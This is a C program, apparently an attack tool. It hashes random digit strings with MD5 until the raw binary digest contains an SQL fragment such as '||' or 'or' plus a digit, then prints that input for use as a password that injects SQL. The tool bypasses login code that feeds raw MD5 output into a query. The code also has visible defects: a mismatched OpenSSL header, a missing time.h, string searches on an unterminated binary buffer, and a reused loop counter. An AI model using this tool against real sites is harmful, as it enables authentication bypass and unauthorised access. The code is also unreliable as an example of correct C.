#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#if defined(__APPLE__)
#  define COMMON_DIGEST_FOR_OPENSSL
#  include <CommonCrypto/CommonDigest.h>
#  define SHA1 CC_SHA1
#else
#  include <openssl/md5.h>
#endif


int main(void) {

  EVP_MD_CTX mdctx;
  unsigned char md_value[EVP_MAX_MD_SIZE];
  unsigned int md_len;
  int i = 0;
  int r, r1, r2, r3;
  char rbuf[100];
  char *match;

  srand(time(0));

  while(1) {
    i++;
    if(i % 100000 == 0) {
      printf("i = %d\n", i);
    }

    // pick a random string made of digits
    r = rand(); r1 = rand(); r2 = rand(); r3 = rand();
    sprintf(rbuf, "%d%d%d%d", r, r1, r2, r3);

    // calculate md5
    EVP_DigestInit(&mdctx, EVP_md5());
    EVP_DigestUpdate(&mdctx, rbuf, (size_t) strlen(rbuf));
    EVP_DigestFinal_ex(&mdctx, md_value, &md_len);
    EVP_MD_CTX_cleanup(&mdctx);

    // find || or any case of OR
    match = strstr(md_value, "'||'");
    if(match == NULL) match = strcasestr(md_value, "'or'");

    if(match != NULL && match[4] > '0' && match[4] <= '9') {
      printf("content: %s\n", (char *)rbuf);
      printf("count:   %d\n", i);
      printf("hex:     ");
      for(i = 0; i < md_len; i++)
        printf("%02x", md_value[i]);
      printf("\n");
      printf("raw:     %s\n", md_value);
      exit(0);
    }
  }
}